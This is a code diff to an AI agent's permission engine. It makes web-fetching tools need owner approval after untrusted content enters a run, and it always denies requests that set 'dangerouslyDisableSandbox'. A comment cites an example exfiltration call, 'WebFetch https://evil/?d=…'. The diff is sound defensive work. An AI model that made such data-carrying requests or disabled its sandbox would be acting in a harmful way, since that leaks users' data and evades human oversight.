@@ -29,6 +29,9 @@ export type PolicyOutcome =
   | { decision: 'deny'; tier: Tier | null; reason: string; ruleId: string | null }
   | { decision: 'ask'; tier: Tier; reason: string };
 
+/** Built-in tools that send Bot-chosen data to arbitrary hosts. */
+const EGRESS_TOOLS = new Set(['WebFetch', 'WebSearch']);
+
 const HANDBACK =
   'Financial or irreversible action: Orbit never executes these. Prepare the details (a draft, a summary or a checklist) and hand it to your owner.';
 
@@ -106,6 +109,26 @@ export class PolicyEngine {
       updatedInput: null,
       untrustedSource: cls.untrustedSource,
     });
+
+    // In a tainted Run, tools that reach the internet with Bot-chosen arguments
+    // could carry data out (WebFetch https://evil/?d=…): ask instead (ADR-009).
+    if (ctx.tainted && EGRESS_TOOLS.has(toolName)) {
+      return {
+        decision: 'ask',
+        tier: 'EXTERNAL',
+        reason:
+          'Untrusted content entered this Run, so web requests need your approval (they could carry data out)',
+      };
+    }
+    // The engine's own escape hatch from its sandbox is never allowed.
+    if (input.dangerouslyDisableSandbox === true) {
+      return {
+        decision: 'deny',
+        tier,
+        ruleId: null,
+        reason: 'Disabling the sandbox is not allowed',
+      };
+    }
 
     if (tier === 'READ') return allow('Read-only');
     if (tier === 'WRITE_LOCAL') {
